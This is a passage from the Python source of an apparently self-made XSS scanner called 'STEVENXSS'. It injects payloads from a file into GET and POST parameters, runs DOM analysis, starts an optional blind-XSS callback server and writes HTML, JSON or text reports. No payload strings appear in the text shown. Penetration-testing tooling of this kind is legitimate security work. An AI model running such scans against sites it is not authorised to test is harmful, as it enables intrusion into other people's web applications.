                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                confidence=reflection_analysis['confidence_score']
            )
            
            if is_successful:
                DisplayManager.print_vulnerability(result)
            
            return result if is_successful else None
            
        except Exception as e:
            # Don't show individual error messages for each request
            logger.debug(f"Error testing {param} with {payload}: {e}")
            return None
    
    async def _test_get_payload(self, url: str, param: str, payload: str, headers: Dict = None) -> tuple[int, str, Dict]:
        """Test payload in GET request"""
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            target_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            return await self.http_client.get(target_url, headers)
        
        return 0, "", {}
    
    async def _test_post_payload(self, url: str, param: str, payload: str, post_data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
        """Test payload in POST request"""
        if post_data and param in post_data:
            test_data = post_data.copy()
            test_data[param] = payload
            return await self.http_client.post(url, test_data, headers)
        
        return 0, "", {}
    
    def _assess_vulnerability_level(self, analysis: Dict) -> VulnerabilityLevel:
        """Assess vulnerability level based on reflection analysis"""
        score = analysis['confidence_score']
        
        if score >= 80:
            return VulnerabilityLevel.CRITICAL
        elif score >= 60:
            return VulnerabilityLevel.HIGH
        elif score >= 40:
            return VulnerabilityLevel.MEDIUM
        else:
            return VulnerabilityLevel.LOW
    
    async def comprehensive_scan(self, target_url: str, payloads_file: str, 
                               method: str = 'GET', post_data: Dict = None,
                               custom_headers: Dict = None, enable_dom: bool = True,
                               enable_blind_xss: bool = False) -> List[ScanResult]:
        """Perform comprehensive XSS scanning"""
        
        DisplayManager.print_section("SCAN INITIALIZATION")
        DisplayManager.print_info(f"Starting comprehensive scan for {target_url}")
        
        # Load and enhance payloads
        base_payloads = self._load_payloads(payloads_file)
        adaptive_payloads = self.payload_engine.generate_adaptive_payloads()
        all_payloads = list(set(base_payloads + adaptive_payloads))
        
        if enable_blind_xss and self.blind_xss:
            blind_payloads = self.blind_xss.generate_blind_payloads()
            all_payloads.extend(blind_payloads)
        
        DisplayManager.print_success(f"Loaded {len(all_payloads)} payloads for testing")
        
        # Extract parameters
        parameters = self._extract_parameters(target_url, post_data)
        if not parameters:
            DisplayManager.print_warning("No parameters found for testing")
            return []
        
        DisplayManager.print_success(f"Found {len(parameters)} parameters to test")
        
        # Calculate total tests for progress tracking
        self.stats['total_tests'] = len(parameters) * len(all_payloads)
        self.stats['current_test'] = 0
        
        DisplayManager.print_section("PAYLOAD TESTING")
        DisplayManager.print_info(f"Starting {self.stats['total_tests']} tests...")
        
        # Test all parameter-payload combinations
        tasks = []
        for param in parameters:
            for payload in all_payloads:
                task = self._test_parameter_payload(
                    target_url, param, payload, method, post_data, custom_headers
                )
                tasks.append(task)
        
        # Execute all tests concurrently
        results = await asyncio.gather(*tasks)
        
        # Clear progress line
        print()
        
        # Process results
        for result in results:
            if result:
                self.results.append(result)
                self.stats['vulnerabilities_found'] += 1
        
        # DOM-based XSS analysis
        if enable_dom:
            DisplayManager.print_section("DOM ANALYSIS")
            DisplayManager.print_info("Starting DOM XSS analysis...")
            dom_analysis = await self.dom_analyzer.analyze_dom_environment(target_url)
            
            for vuln in dom_analysis.get('vulnerabilities', []):
                dom_result = ScanResult(
                    url=target_url,
                    parameter="DOM",
                    payload=vuln['payload'],
                    context=ScanContext.DOM,
                    level=VulnerabilityLevel.HIGH,
                    reflection_data={},
                    dom_analysis=vuln,
                    timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                    confidence=vuln['confidence']
                )
                self.results.append(dom_result)
                self.stats['vulnerabilities_found'] += 1
                self.stats['dom_vulnerabilities'] += 1
        
        DisplayManager.print_success(f"Scan completed. Found {self.stats['vulnerabilities_found']} vulnerabilities")
        return self.results
    
    def generate_report(self, format: str = "html") -> str:
        """Generate comprehensive scan report"""
        DisplayManager.print_section("REPORT GENERATION")
        DisplayManager.print_info(f"Generating {format.upper()} report...")
        
        if format == "html":
            return self._generate_html_report()
        elif format == "json":
            return self._generate_json_report()
        elif format == "text":
            return self._generate_text_report()
        else:
            return self._generate_text_report()
    
    def _generate_html_report(self) -> str:
        """Generate interactive HTML report"""
        scan_duration = self.get_scan_duration()
        
        html_report = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STEVENXSS v1.0 - Security Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ text-align: center; border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #007bff; }}
        .vulnerability {{ border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 8px; }}
        .critical {{ border-left: 4px solid #dc3545; background: #f8d7da; }}
        .high {{ border-left: 4px solid #fd7e14; background: #fff3cd; }}
        .medium {{ border-left: 4px solid #ffc107; background: #fefefe; }}
        .low {{ border-left: 4px solid #28a745; background: #f8f9fa; }}
        .payload {{ font-family: monospace; background: #f1f1f1; padding: 5px; border-radius: 3px; }}
        .context-badge {{ display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; margin: 2px; }}
        .html {{ background: #e3f2fd; color: #1565c0; }}
        .attribute {{ background: #f3e5f5; color: #7b1fa2; }}
        .javascript {{ background: #e8f5e8; color: #2e7d32; }}
        .dom {{ background: #fff3e0; color: #ef6c00; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ STEVENXSS v1.0 Security Scan Report</h1>
            <p>Advanced DOM XSS Scanner - Developed by STEVEN</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total Requests</h3>
                <p style="font-size: 24px; font-weight: bold; color: #007bff;">{self.stats['total_requests']}</p>
            </div>
            <div class="stat-card">
                <h3>Vulnerabilities Found</h3>
                <p style="font-size: 24px; font-weight: bold; color: #dc3545;">{self.stats['vulnerabilities_found']}</p>
            </div>
            <div class="stat-card">
                <h3>DOM Vulnerabilities</h3>
                <p style="font-size: 24px; font-weight: bold; color: #fd7e14;">{self.stats['dom_vulnerabilities']}</p>
            </div>
            <div class="stat-card">
                <h3>Scan Duration</h3>
                <p style="font-size: 24px; font-weight: bold; color: #28a745;">{scan_duration:.2f}s</p>
            </div>
        </div>
        
        <h2>📋 Vulnerability Details</h2>
"""
        
        if self.results:
            for i, result in enumerate(self.results):
                context_badges = "".join([
                    f'<span class="context-badge {result.context.value}">{result.context.value}</span>'
                ])
                
                html_report += f"""
        <div class="vulnerability {result.level.value}">
            <h3>Vulnerability #{i+1} - <span style="color: {'#dc3545' if result.level == VulnerabilityLevel.CRITICAL else '#fd7e14' if result.level == VulnerabilityLevel.HIGH else '#ffc107' if result.level == VulnerabilityLevel.MEDIUM else '#28a745'}">{result.level.value.upper()}</span></h3>
            <p><strong>Parameter:</strong> {result.parameter}</p>
            <p><strong>Payload:</strong> <code class="payload">{html.escape(result.payload)}</code></p>
            <p><strong>Context:</strong> {context_badges}</p>
            <p><strong>Confidence:</strong> {result.confidence:.1f}%</p>
            <p><strong>URL:</strong> <code>{html.escape(result.url)}</code></p>
            <p><strong>HTTP Status:</strong> {result.http_status}</p>
            <p><strong>Timestamp:</strong> {result.timestamp}</p>
        </div>
"""
        else:
            html_report += """
        <div style="text-align: center; padding: 40px;">
            <h3 style="color: #28a745;">✅ No vulnerabilities detected</h3>
            <p>The target appears to have proper XSS protection measures in place.</p>
        </div>
"""
        
        html_report += """
    </div>
</body>
</html>
"""
        
        return html_report
    
    def _generate_json_report(self) -> str:
        """Generate JSON report"""
        report_data = {
            'metadata': {
                'tool': 'STEVENXSS v1.0',
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'scan_duration': self.get_scan_duration()
            },
            'statistics': self.stats,
            'vulnerabilities': [
                {
                    'parameter': r.parameter,
                    'payload': r.payload,
                    'context': r.context.value,
                    'level': r.level.value,
                    'confidence': r.confidence,
                    'url': r.url,
                    'http_status': r.http_status,
                    'timestamp': r.timestamp,
                    'reflection_analysis': r.reflection_data
                }
                for r in self.results
            ],
            'successful_contexts': [c.value for c in self.successful_contexts]
        }
        
        return json.dumps(report_data, indent=2, ensure_ascii=False)
    
    def _generate_text_report(self) -> str:
        """Generate text report"""
        scan_duration = self.get_scan_duration()
        
        report = f"""
STEVENXSS v1.0 - Security Scan Report
=====================================

Scan Statistics:
----------------
• Total Requests: {self.stats['total_requests']}
• Vulnerabilities Found: {self.stats['vulnerabilities_found']}
• DOM Vulnerabilities: {self.stats['dom_vulnerabilities']}
• Scan Duration: {scan_duration:.2f} seconds
• Successful Contexts: {', '.join([c.value for c in self.successful_contexts])}

Vulnerabilities:
---------------
"""
        
        if self.results:
            for i, result in enumerate(self.results):
                report += f"""
{i+1}. {result.level.value.upper()} - {result.parameter}
   Payload: {result.payload}
   Context: {result.context.value}
   Confidence: {result.confidence:.1f}%
   URL: {result.url}
   HTTP Status: {result.http_status}
   Timestamp: {result.timestamp}
"""
        else:
            report += "\nNo vulnerabilities detected.\n"
        
        return report

def parse_post_data(post_string: str) -> Dict:
    """Parse POST data from string"""
    if not post_string:
        return {}
    
    post_data = {}
    try:
        pairs = post_string.split('&')
        for pair in pairs:
            key, value = pair.split('=', 1)
            post_data[key] = value
        return post_data
    except Exception as e:
        DisplayManager.print_error(f"Error parsing POST data: {e}")
        return {}

async def main():
    """Main function"""
    # Display welcome banner
    DisplayManager.print_banner()
    
    parser = argparse.ArgumentParser(description='STEVENXSS v1.5 - Advanced DOM XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-f', '--file', required=True, help='Payload file path')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data (e.g., "param1=value1&param2=value2")')
    parser.add_argument('-H', '--headers', help='Custom headers JSON file')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Max concurrent requests')
    parser.add_argument('--dom', action='store_true', help='Enable DOM XSS analysis')
    parser.add_argument('--blind-xss', help='Enable blind XSS with callback domain')
    parser.add_argument('--blind-port', type=int, default=8888, help='Blind XSS callback port')
    parser.add_argument('--report-format', default='html', choices=['html', 'json', 'text'], help='Report format')
    
    args = parser.parse_args()
    
    # Parse POST data
    post_data = parse_post_data(args.data) if args.data else {}
    
    # Load custom headers
    custom_headers = {}
    if args.headers:
        try:
            with open(args.headers, 'r') as f:
                custom_headers = json.load(f)
        except Exception as e:
            DisplayManager.print_error(f"Error loading headers: {e}")
    
    # Initialize scanner
    scanner = STEVENXSSScanner(max_concurrency=args.threads)
    
    # Initialize blind XSS if enabled
    blind_xss = None
    if args.blind_xss:
        blind_xss = BlindXSSIntegration(args.blind_xss, args.blind_port)
        await blind_xss.start_callback_server()
        scanner.blind_xss = blind_xss
    
    try:
        await scanner.initialize()
        
        # Perform scan
        DisplayManager.print_section("SCAN STARTED")
        results = await scanner.comprehensive_scan(
            target_url=args.url,
            payloads_file=args.file,
            method=args.method,
            post_data=post_data,
            custom_headers=custom_headers,
            enable_dom=args.dom,
            enable_blind_xss=bool(args.blind_xss)
        )
        
        # Generate report
        report = scanner.generate_report(args.report_format)
        
        # Save report
        timestamp = int(time.time())
        report_file = f'stevenxss_report_{timestamp}.{args.report_format}'
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        DisplayManager.print_success(f"Scan completed. Found {len(results)} vulnerabilities")
        DisplayManager.print_success(f"Report saved: {report_file}")
        
        # Print blind XSS statistics if enabled
        if blind_xss:
            stats = blind_xss.get_callback_statistics()
            DisplayManager.print_info(f"Blind XSS callbacks received: {stats['total_callbacks']}")
        
        # Print summary to console - حساب الوقت هنا بعد انتهاء المسح مباشرة
        scan_duration = scanner.get_scan_duration()
        DisplayManager.print_section("SCAN SUMMARY")
        print(f"{TerminalColors.GREEN}🎯 Total Vulnerabilities: {TerminalColors.WHITE}{len(results)}{TerminalColors.END}")
        print(f"{TerminalColors.YELLOW}🔍 DOM Vulnerabilities: {TerminalColors.WHITE}{scanner.stats['dom_vulnerabilities']}{TerminalColors.END}")
        print(f"{TerminalColors.CYAN}⏱️  Scan Duration: {TerminalColors.WHITE}{scan_duration:.2f}s{TerminalColors.END}")
        print(f"{TerminalColors.MAGENTA}📄 Report File: {TerminalColors.WHITE}{report_file}{TerminalColors.END}")
        
    finally:
        await scanner.close()
        if blind_xss:
            await blind_xss.stop_callback_server()

if __name__ == "__main__":
    asyncio.run(main())
